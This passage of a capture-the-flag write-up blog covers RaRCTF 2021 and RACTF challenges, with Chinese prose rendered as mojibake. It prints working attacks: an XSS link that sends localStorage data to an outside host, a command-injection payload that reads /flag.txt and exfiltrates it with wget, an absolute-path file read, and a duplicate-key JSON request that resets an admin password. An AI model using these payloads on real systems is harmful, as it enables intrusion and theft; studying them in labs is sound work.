å˜é‡çš„ä½ç½®ï¼Œå†é™„åŠ è°ƒè¯•ååœ¨æ¸¸æˆä¸­å°è¯•ä¸€æ¬¡å°†æ¸¸æˆè§’è‰²çš„ HP å‡ä¸º 0 çš„æ–¹å—ï¼Œæ‰¾å‡ºå‘å…¶ä¸­å†™å…¥å€¼çš„å‡½æ•°å¹¶ NOP æ‰å³å¯åœ¨æ¸¸æˆè§’è‰² HP è¢«å˜ä¸º 0 ä¹‹åä½¿å¾—æ¸¸æˆä¸è¢«é‡ç½®è€Œçœ‹åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/a13494bb-6130-4ccf-8ca4-202b501898a0/1629274765622333/5d0f9231957d53834c7154e710390cd5696aeb99.png"></p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/a13494bb-6130-4ccf-8ca4-202b501898a0/1629275027310019/afc410f5a95c43ae1bcc222f2b798f8ad63a0e6c.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ractf&#123;Y0uB3tt3rN0tHav3De0bfusc4ted...&#125;</span><br></pre></td></tr></table></figure><h2 id="Steganography"><a href="#Steganography" class="headerlink" title="Steganography"></a>Steganography</h2><h3 id="The-Glory-Days"><a href="#The-Glory-Days" class="headerlink" title="The Glory Days"></a>The Glory Days</h3><blockquote><p>My friend sent me this audio file, Iâ€™m sure I recognise it but I think heâ€™s tweaked it to hide a message somewhere. Can you take a look?</p></blockquote><p>é™„ä»¶æ˜¯ä¸€ä¸ª Midi æ–‡ä»¶ï¼Œä½¿ç”¨ Midi Editor æ‰“å¼€æ–‡ä»¶å¯åœ¨ Track 0 çš„ä½ç½®å‘ç°æ‘©æ–¯ç”µç ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/a13494bb-6130-4ccf-8ca4-202b501898a0/1629278284838741/6ec953331d6f392b0ae7ba1137c5d7688d1555f4.png"></p><p>å°†å…¶æŠ„å†™ä¸‹æ¥å¯ä»¥å¾—åˆ°å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--- .--- --.- .-- --. ..... -.. --. .--. -. --. -..- -.- ....- --.. .-. -- -. .--. ..- ..--- -- -.. ... -.- -. ... ...- -.... - .-.. ..-. --- -. .--- - .. --.. --.. - .--. ..- </span><br></pre></td></tr></table></figure><p>ä½¿ç”¨å¦‚ä¸‹çš„ CyberChef Receipt å¤„ç†ä¹‹åå¯å¾— flagã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">From_Morse_Code(&#39;Space&#39;,&#39;Line feed&#39;)</span><br><span class="line">From_Base32(&#39;A-Z2-7&#x3D;&#39;,true)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ractf&#123;Mus1c_M0rSe_MesS4g3&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>RaRCTF 2021</title>
      <link href="/zh-CN/posts/837b9c99.html"/>
      <url>/zh-CN/posts/837b9c99.html</url>
      
        <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Fancy-Button-Generator"><a href="#Fancy-Button-Generator" class="headerlink" title="Fancy Button Generator"></a>Fancy Button Generator</h3><blockquote><p>Check out this cool new fancy button generator! The buttons even glow!</p></blockquote><p>å°†ç»™å‡ºçš„é™„ä»¶æºç ä¸‹è½½ï¼Œå¯ä»¥å¾ˆæ˜æ˜¾çœ‹å‡ºè¿™æ˜¯ä¸€ä¸ª XSS çš„é¢˜ç›®ï¼ŒåŒæ—¶ä½¿ç”¨äº†ä¸€ä¸ªå·¥ä½œé‡è¯æ˜ï¼ˆProof Of Workï¼‰çš„éªŒè¯æœºåˆ¶ã€‚</p><blockquote><p>Proof of work: <a href="https://en.wikipedia.org/wiki/Proof_of_work">https://en.wikipedia.org/wiki/Proof_of_work</a></p></blockquote><p>é¢˜ç›®çš„é™„ä»¶ä¸­ç»™å‡ºäº†å…¶è®¡ç®—æ–¹æ³•ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span>():</span></span><br><span class="line">    <span class="keyword">return</span> uuid.uuid4().<span class="built_in">hex</span>[:<span class="number">4</span>], uuid.uuid4().<span class="built_in">hex</span>[:<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify</span>(<span class="params">prefix, suffix, answer, difficulty=<span class="number">6</span></span>):</span></span><br><span class="line">    <span class="built_in">hash</span> = hashlib.sha256(prefix.encode() + answer.encode() + suffix.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hash</span>.endswith(<span class="string">&quot;0&quot;</span> * difficulty)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">prefix, suffix, difficulty</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        test = binascii.hexlify(os.urandom(<span class="number">4</span>)).decode()</span><br><span class="line">        <span class="keyword">if</span> verify(prefix, suffix, test, difficulty):</span><br><span class="line">            <span class="keyword">return</span> test</span><br></pre></td></tr></table></figure><p>å› æ­¤åªéœ€è¦å…ˆè¯·æ±‚è·å¾—å‰ç¼€å’Œåç¼€ï¼ŒSolve å®Œæˆä¹‹åæäº¤æ•°æ®å³å¯è·å¾—ä¸€æ¬¡å‘é€æŒ‰é’®çš„æƒåŠ›ã€‚å†æ¥çœ‹ admin æ˜¯å¦‚ä½•æ“ä½œæŒ‰é’®çš„ï¼Œåœ¨ç»™å‡ºçš„é™„ä»¶ä¸­æœ‰å¦‚ä¸‹ä»£ç ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> page.evaluate(<span class="function"><span class="params">flag</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">localStorage</span>.flag = flag;</span><br><span class="line">    &#125;, process.env.FLAG);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> url = process.env.SITE + <span class="string">&quot;button?title=&quot;</span> + req.title + <span class="string">&quot;&amp;link=&quot;</span> + req.link;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;Going to &quot;</span>, url);</span><br><span class="line">    <span class="keyword">await</span> page.goto(url, &#123;</span><br><span class="line">        waitUntil: <span class="string">&quot;networkidle2&quot;</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">await</span> page.click(<span class="string">&quot;#btn&quot;</span>);</span><br><span class="line">    <span class="keyword">await</span> page.waitForTimeout(TIMEOUT);</span><br><span class="line">    <span class="keyword">await</span> page.close();</span><br><span class="line">    page = <span class="literal">null</span>;</span><br></pre></td></tr></table></figure><p>å¾ˆå®¹æ˜“å‘ç° admin å…¶å®æ˜¯ç›´æ¥ç‚¹å‡»äº†æŒ‰é’®ï¼Œç„¶åç­‰äº†ä¸€ä¸‹å°±å…³é—­äº†é¡µé¢ã€‚é‚£ä¹ˆæ­¤æ—¶åªéœ€è¦å¯¹æŒ‰é’®è¿›è¡Œ XSS å³å¯ã€‚ä½¿ç”¨ <code>javascript:alert(1)</code> å¯ä»¥è¾¾æˆç‚¹å‡»æŒ‰é’®åå¼¹çª—çš„æ•ˆæœã€‚å› æ­¤å¯ä»¥åœ¨ GET å‚æ•° link å¤„è¿›è¡Œ XSS æ¥å°è¯•å–å‡º localStorage.flag ç„¶åå‘èµ·ä¸€æ¬¡å¯¹å¤–çš„è¯·æ±‚æ¥è·å– flagã€‚æ„é€ å‡ºå¦‚ä¸‹è„šæœ¬æ¥è¿›è¡Œ XSSã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">session = requests.session()</span><br><span class="line">host = <span class="string">&quot;https://fbg.rars.win/&quot;</span></span><br><span class="line">data = session.get(host + <span class="string">&quot;pow&quot;</span>).json()</span><br><span class="line">solution = solve(data[<span class="string">&#x27;pref&#x27;</span>], data[<span class="string">&#x27;suff&#x27;</span>], <span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Solved POW: <span class="subst">&#123;solution&#125;</span> with prefix <span class="subst">&#123;data[<span class="string">&#x27;pref&#x27;</span>]&#125;</span> suffix <span class="subst">&#123;data[<span class="string">&#x27;suff&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">session.post(host + <span class="string">&quot;pow&quot;</span>, json=&#123;<span class="string">&quot;answer&quot;</span>: solution&#125;)</span><br><span class="line">name = <span class="string">&quot;&quot;</span></span><br><span class="line">link = <span class="string">&quot;javascript:window.location.replace(&#x27;http://HOST/?flagis-&#x27;%252BlocalStorage.getItem(&#x27;flag&#x27;))&quot;</span></span><br><span class="line">response = session.get(host + <span class="string">f&quot;admin?title=<span class="subst">&#123;name&#125;</span>&amp;link=<span class="subst">&#123;link&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬å³å¯åœ¨ç«¯å£ç›‘å¬å¤„å¾—åˆ°å¦‚ä¸‹è¯·æ±‚æ•°æ®ï¼Œä»è€Œå¯ä»¥å¾—åˆ° flagã€‚</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?flagis-rarctf&#123;th0s3_f4ncy_butt0n5_w3r3_t00_cl1ck4bl3_f0r_u5_a4667cb69f&#125;</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>8.136.8.210:3255</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/92.0.4515.107 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rarctf&#123;th0s3_f4ncy_butt0n5_w3r3_t00_cl1ck4bl3_f0r_u5_a4667cb69f&#125;</span><br></pre></td></tr></table></figure><h3 id="lemonthinker"><a href="#lemonthinker" class="headerlink" title="lemonthinker"></a>lemonthinker</h3><blockquote><p>generate your lemonthinks here!</p><p>Note: All characters that look like a <code>O</code> are actually a <code>0</code>, please  try replacing all <code>O</code>â€˜s with  <code>0</code>â€˜s if you find that your flag does not work.</p></blockquote><p>é¢˜ç›®ç»™å‡ºçš„æºä»£ç å¦‚ä¸‹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, redirect, url_for</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time <span class="comment"># lemonthink</span></span><br><span class="line"></span><br><span class="line">clean = time.time()</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">chars = <span class="built_in">list</span>(string.ascii_letters + string.digits)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;index.html&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/generate&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span>():</span></span><br><span class="line">    <span class="keyword">global</span> clean</span><br><span class="line">    <span class="keyword">if</span> time.time() - clean &gt; <span class="number">60</span>:</span><br><span class="line">      os.system(<span class="string">&quot;rm static/images/*&quot;</span>)</span><br><span class="line">      clean = time.time()</span><br><span class="line">    text = request.form.getlist(<span class="string">&#x27;text&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    text = text.replace(<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    filename = <span class="string">&quot;&quot;</span>.join(random.choices(chars,k=<span class="number">8</span>)) + <span class="string">&quot;.png&quot;</span></span><br><span class="line">    os.system(<span class="string">f&quot;python3 generate.py <span class="subst">&#123;filename&#125;</span> \&quot;<span class="subst">&#123;text&#125;</span>\&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;static&#x27;</span>, filename=<span class="string">&#x27;images/&#x27;</span> + filename), code=<span class="number">301</span>)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">  app.run(<span class="string">&quot;0.0.0.0&quot;</span>,<span class="number">1002</span>)</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶å¯ä»¥çœ‹å‡ºæœ‰ä¸€ä¸ªå‚æ•°å¯æ§ï¼Œåªéœ€è¦ä¼ å…¥ text å³å¯è¿›è¡Œ RCEã€‚æ„é€ å‡ºå¦‚ä¸‹è½½è·è¯»å–æ–‡ä»¶ /flag.txt å¹¶ä½¿ç”¨ wget å¸¦å‡ºï¼Œé¶æœºä¼¼ä¹æ²¡æœ‰ curlã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(cat /flag.txt | xargs -I&#123;&#125; wget <span class="string">&quot;http://HOST/?flagis-&#123;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><p>è½½è·å‘é€ååœ¨ç›‘å¬ç«¯å¯ä»¥å¾—åˆ°å¦‚ä¸‹è¯·æ±‚æ•°æ®ï¼Œå³å¾—åˆ° flagã€‚</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?flagis-rarctf&#123;b451c-c0mm4nd_1nj3ct10n_f0r-y0u_4nd_y0ur-l3m0nth1nk3rs_d8d21128bf&#125;</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>8.136.8.210:3255</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Wget</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rarctf&#123;b451c-c0mm4nd_1nj3ct10n_f0r-y0u_4nd_y0ur-l3m0nth1nk3rs_d8d21128bf&#125;</span><br></pre></td></tr></table></figure><h3 id="Secure-Uploader"><a href="#Secure-Uploader" class="headerlink" title="Secure Uploader"></a>Secure Uploader</h3><blockquote><p>A new secure, safe and smooth uploader!</p></blockquote><p>é¢˜ç›®æ‰€ç»™å‡ºçš„ä¸Šä¼ å’Œè®¿é—®è·¯ç”±çš„ä»£ç å¦‚ä¸‹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;.&quot;</span> <span class="keyword">in</span> file.filename:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Bad filename!&quot;</span>, <span class="number">403</span></span><br><span class="line">    conn = db()</span><br><span class="line">    cur = conn.cursor()</span><br><span class="line">    uid = uuid.uuid4().<span class="built_in">hex</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cur.execute(<span class="string">&quot;insert into files (id, path) values (?, ?)&quot;</span>, (uid, file.filename,))</span><br><span class="line">    <span class="keyword">except</span> sqlite3.IntegrityError:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Duplicate file&quot;</span></span><br><span class="line">    conn.commit()</span><br><span class="line">    file.save(<span class="string">&#x27;uploads/&#x27;</span> + file.filename)</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&#x27;/file/&#x27;</span> + uid)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/file/&lt;id&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    conn = db()</span><br><span class="line">    cur = conn.cursor()</span><br><span class="line">    cur.execute(<span class="string">&quot;select path from files where id=?&quot;</span>, (<span class="built_in">id</span>,))</span><br><span class="line">    res = cur.fetchone()</span><br><span class="line">    <span class="keyword">if</span> res <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;File not found&quot;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(<span class="string">&quot;uploads/&quot;</span>, res[<span class="number">0</span>]), <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°æ–‡ä»¶ä¸Šä¼ ä¹‹åä¼šç”Ÿæˆä¸€ä¸ª idï¼Œç„¶åè®¿é—®çš„æ—¶å€™åªé€šè¿‡è¿™ä¸ª id è¿›è¡Œæ–‡ä»¶è¯»å–ã€‚ä¸Šä¼ æ—¶æ–‡ä»¶åä¸­ä¸å…è®¸æœ‰ . å­—ç¬¦ï¼Œè€Œå…¶ä»–çš„å­—ç¬¦é€šé€šæ²¡æœ‰å¤„ç†ï¼Œå› æ­¤ä¸èƒ½ç›®å½•ç©¿è¶Šè¯»æ–‡ä»¶ã€‚å†çœ‹è®¿é—®çš„è·¯ç”±ï¼Œä½¿ç”¨äº† <code>os.path.join</code> æ¥å°†æ–‡ä»¶åä¸è·¯å¾„æ‹¼æ¥ä»è€Œè¿›è¡Œè¯»å–ã€‚åœ¨è¿™ä¸ªæ–¹æ³•çš„æ–‡æ¡£ä¸­æœ‰å¦‚ä¸‹ä¸€å¥è¯ã€‚</p><blockquote><p>If a component is an absolute path, all previous components are thrown away and joining continues from the absolute path component.</p></blockquote><p>å‡è®¾æ­¤æ—¶çš„ <code>res[0]</code> å˜æˆäº†ç»å¯¹è·¯å¾„ï¼Œä¹Ÿå°±æ˜¯ <code>/flag</code>ï¼Œé‚£ä¹ˆæ­¤å‰çš„æ‰€æœ‰è·¯å¾„å°±ä¼šè¢«æŠ›å¼ƒï¼Œè¿›è€Œè¯»å–åˆ°æ ¹ç›®å½•ä¸‹çš„ flagã€‚å› æ­¤æ„é€ å‡ºå¦‚ä¸‹ä¸¤ä¸ªè¯·æ±‚æ¥è·å– flagã€‚</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>193.57.159.27:35294</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>282</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary51X6ZmnbrL0hXAYM</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary51X6ZmnbrL0hXAYM</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;file&quot;; filename=&quot;/flag&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>image/png</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary51X6ZmnbrL0hXAYM</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">Upload File</span><br><span class="line">------WebKitFormBoundary51X6ZmnbrL0hXAYM--</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/file/d129a262e4724c549cda37a51755e1bf</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>193.57.159.27:35294</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åœ¨ä½¿ç”¨ç¬¬ä¸€ä¸ªè¯·æ±‚è·å¾—çš„é“¾æ¥è¯·æ±‚è®¿é—®æ–‡ä»¶åå¯è·å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rarctf&#123;4lw4y5_r34d_th3_d0c5_pr0p3rly!-71ed16&#125;</span><br></pre></td></tr></table></figure><h3 id="Microservices-As-A-Service-3"><a href="#Microservices-As-A-Service-3" class="headerlink" title="Microservices As A Service 3"></a>Microservices As A Service 3</h3><p>manager ä¸­çš„ update è·¯ç”±å°† JSON æ•°æ®ç”± Python ä¼ é€’åˆ° Golang çš„æœåŠ¡ä¸­å¤„ç†ã€‚JSON çš„è§£æ Golang ä¸­ä½¿ç”¨çš„æ¨¡å—æ˜¯ github.com/buger/jsonparserã€‚ç¨å¾®æµ‹ä¸€ä¸‹å¯ä»¥å‘ç°å½“ JSON é”®å€¼é‡å¤çš„æ—¶å€™å…¶å°†é€‰æ‹©å‰è€…ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;github.com/buger/jsonparser&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">str := <span class="string">&quot;&#123;\&quot;key\&quot;: \&quot;value1\&quot;, \&quot;key\&quot;: \&quot;value2\&quot;&#125;&quot;</span></span><br><span class="line">bytes_str := []<span class="keyword">byte</span>(str)</span><br><span class="line">fmt.Println(jsonparser.GetString(bytes_str, <span class="string">&quot;key&quot;</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„ä»£ç çš„è¿è¡Œç»“æœæ˜¯ value1 &lt;nil&gt;ã€‚è€Œåœ¨ Python ä¸­ï¼Œå½“ JSON çš„é”®å€¼é‡å¤æ—¶å…¶å°†é€‰æ‹©åè€…ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line">jObject = json.loads(<span class="string">&quot;&#123;\&quot;key\&quot;: \&quot;value1\&quot;, \&quot;key\&quot;: \&quot;value2\&quot;&#125;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(jObject[<span class="string">&quot;key&quot;</span>])</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„ä»£ç çš„è¿è¡Œç»“æœæ˜¯ value2ã€‚å› æ­¤æ­¤æ—¶åªéœ€è¦è®©é”®å€¼é‡å¤å³å¯ç»•è¿‡é™åˆ¶ä¿®æ”¹ admin å³ id ä¸º 0 çš„ç”¨æˆ·çš„å¯†ç ã€‚æ„é€ å‡ºå¦‚ä¸‹çš„è¯·æ±‚æ¥ä¿®æ”¹ admin çš„å¯†ç ã€‚</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/manager/update</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>maas.rars.win</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>52</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=eyJtYW5hZ2VyaWQiOiIxIiwibWFuYWdlcm5hbWUiOiJMZW1vblByZWZlY3QifQ.YRPO1A.PH8WHzCXnxjEwlMIUQvkfzxyuGc</span><br><span class="line"></span><br><span class="line">&#123;&quot;id&quot;:0,&quot;id&quot;:1,&quot;password&quot;:&quot;this_is_a_long_password&quot;&#125;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ä½¿ç”¨ä¿®æ”¹çš„å¯†ç å†å»ç™»å½• admin è´¦æˆ·å³å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 